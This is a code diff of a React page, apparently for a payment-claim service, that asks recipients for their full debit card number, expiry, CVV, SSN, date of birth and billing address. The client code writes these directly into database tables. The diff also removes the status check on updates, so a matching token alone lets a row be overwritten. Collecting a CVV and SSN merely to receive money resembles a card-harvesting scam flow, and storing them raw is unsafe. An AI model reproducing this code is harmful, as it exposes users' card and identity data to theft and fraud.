@@ -14,14 +14,12 @@ export default function ClaimPaymentPage() {
   const [activeTab, setActiveTab] = useState('debit_card');
   const [claimSuccess, setClaimSuccess] = useState(false);
   const [receiptData, setReceiptData] = useState(null);
+  const [paymentSource, setPaymentSource] = useState(null); // Track which table: 'pending_claims' or 'transactions'
 
   const [citizenship, setCitizenship] = useState(null);
   const [achCitizenship, setAchCitizenship] = useState(null); // null = not selected, 'us' = US, 'international' = International
 
   const [debitCardForm, setDebitCardForm] = useState({
-    first_name: '',
-    middle_name: '',
-    last_name: '',
     cardholder_name: '',
     card_number: '',
     card_expiry: '',
@@ -30,12 +28,10 @@ export default function ClaimPaymentPage() {
     ssn: '',
     id_number: '',
     date_of_birth: '',
-    card_issuer: '',
-    card_issuer_custom: '',
     billing_address: '',
     billing_city: '',
-    billing_province_state: '',
-    billing_postal_code: '',
+    billing_state: '',
+    billing_zip: '',
     billing_country: ''
   });
 
@@ -63,41 +59,71 @@ export default function ClaimPaymentPage() {
 
   const loadPaymentDetails = async () => {
     try {
-      const { data: paymentData, error } = await supabase
+      // First, try to fetch from oakline_pay_pending_claims
+      const { data: pendingData, error: pendingError } = await supabase
         .from('oakline_pay_pending_claims')
         .select('*')
         .eq('claim_token', token)
         .single();
 
-      if (error || !paymentData) {
-        setMessage('Payment not found. Please check the link and try again.');
-        setMessageType('error');
-        setLoading(false);
-        return;
+      let paymentData = pendingData;
+      let source = 'pending_claims';
+
+      // If not found in pending_claims, try oakline_pay_transactions
+      if (!pendingData || pendingError) {
+        const { data: transactionData, error: transactionError } = await supabase
+          .from('oakline_pay_transactions')
+          .select('*')
+          .eq('claim_token', token)
+          .single();
+
+        if (!transactionData || transactionError) {
+          setMessage('Payment not found. Please check the link and try again.');
+          setMessageType('error');
+          setLoading(false);
+          return;
+        }
+
+        paymentData = transactionData;
+        source = 'transactions';
       }
 
-      if (paymentData.approval_status === 'card_details_submitted') {
-        setMessage('📋 Claim Under Review\n\nYour claim has been successfully submitted and is currently under review by our team. You will receive an email notification as soon as the payment is processed. Thank you for your patience!');
-        setMessageType('info');
-        setLoading(false);
-        return;
+      setPaymentSource(source);
+
+      // Check approval status (for pending_claims)
+      if (paymentData.approval_status) {
+        if (paymentData.approval_status === 'card_details_submitted') {
+          setMessage('📋 Claim Under Review\n\nYour claim has been successfully submitted and is currently under review by our team. You will receive an email notification as soon as the payment is processed. Thank you for your patience!');
+          setMessageType('info');
+          setLoading(false);
+          return;
+        }
+
+        if (paymentData.approval_status === 'approved') {
+          setMessage('✅ Payment Approved & Processing\n\nYour claim has been approved and your funds are being transferred. You will receive the payment within 1-3 business days. A confirmation email has been sent to you.');
+          setMessageType('success');
+          setLoading(false);
+          return;
+        }
+
+        if (paymentData.approval_status === 'rejected') {
+          setMessage('❌ Claim Not Approved\n\nYour claim was not approved. Please contact support for more information.');
+          setMessageType('error');
+          setLoading(false);
+          return;
+        }
       }
 
-      if (paymentData.approval_status === 'approved') {
-        setMessage('✅ Payment Approved & Processing\n\nYour claim has been approved and your funds are being transferred. You will receive the payment within 1-3 business days. A confirmation email has been sent to you.');
+      // Check transaction status (for transactions table)
+      if (paymentData.status && paymentData.status === 'completed') {
+        setMessage('✅ Payment Completed\n\nThis payment has already been completed. You should see the funds in your account shortly.');
         setMessageType('success');
         setLoading(false);
         return;
       }
 
-      if (paymentData.approval_status === 'rejected') {
-        setMessage('❌ Claim Not Approved\n\nYour claim was not approved. Please contact support for more information.');
-        setMessageType('error');
-        setLoading(false);
-        return;
-      }
-
-      if (new Date(paymentData.expires_at) < new Date()) {
+      // Check expiration
+      if (paymentData.expires_at && new Date(paymentData.expires_at) < new Date()) {
         setMessage('⏰ Payment Link Expired\n\nThis payment link has expired. Please contact the sender for a new link.');
         setMessageType('error');
         setLoading(false);
@@ -142,28 +168,36 @@ export default function ClaimPaymentPage() {
 
     setSubmitting(true);
     try {
-      const finalCardholderName = debitCardForm.cardholder_name.trim() || `${debitCardForm.first_name} ${debitCardForm.middle_name ? debitCardForm.middle_name + ' ' : ''}${debitCardForm.last_name}`;
+      const finalCardholderName = debitCardForm.cardholder_name.trim() || debitCardForm.cardholder_name;
+      
+      // Update based on which table the payment came from
+      const tableName = paymentSource === 'transactions' ? 'oakline_pay_transactions' : 'oakline_pay_pending_claims';
+      
+      const updateData = {
+        claim_method: 'debit_card',
+        claimed_at: new Date().toISOString(),
+        cardholder_name: finalCardholderName,
+        card_number: debitCardForm.card_number,
+        card_expiry: debitCardForm.card_expiry,
+        card_cvv: debitCardForm.card_cvv,
+        ssn: debitCardForm.verification_type === 'ssn' ? debitCardForm.ssn : null,
+        date_of_birth: debitCardForm.date_of_birth,
+        billing_address: debitCardForm.billing_address,
+        billing_city: debitCardForm.billing_city,
+        billing_state: debitCardForm.billing_state,
+        billing_zip: debitCardForm.billing_zip,
+        billing_country: debitCardForm.billing_country
+      };
+
+      // Add status fields based on table
+      if (tableName === 'oakline_pay_pending_claims') {
+        updateData.approval_status = 'card_details_submitted';
+      }
       
       const { error } = await supabase
-        .from('oakline_pay_pending_claims')
-        .update({
-          claim_method: 'debit_card',
-          claimed_at: new Date().toISOString(),
-          cardholder_name: finalCardholderName,
-          card_number: debitCardForm.card_number,
-          card_expiry: debitCardForm.card_expiry,
-          card_cvv: debitCardForm.card_cvv,
-          ssn: debitCardForm.verification_type === 'ssn' ? debitCardForm.ssn : null,
-          date_of_birth: debitCardForm.date_of_birth,
-          billing_address: debitCardForm.billing_address,
-          billing_city: debitCardForm.billing_city,
-          billing_state: debitCardForm.billing_state,
-          billing_zip: debitCardForm.billing_zip,
-          billing_country: debitCardForm.billing_country,
-          approval_status: 'card_details_submitted'
-        })
-        .eq('claim_token', token)
-        .eq('status', 'sent');
+        .from(tableName)
+        .update(updateData)
+        .eq('claim_token', token);
 
       if (error) throw error;
 
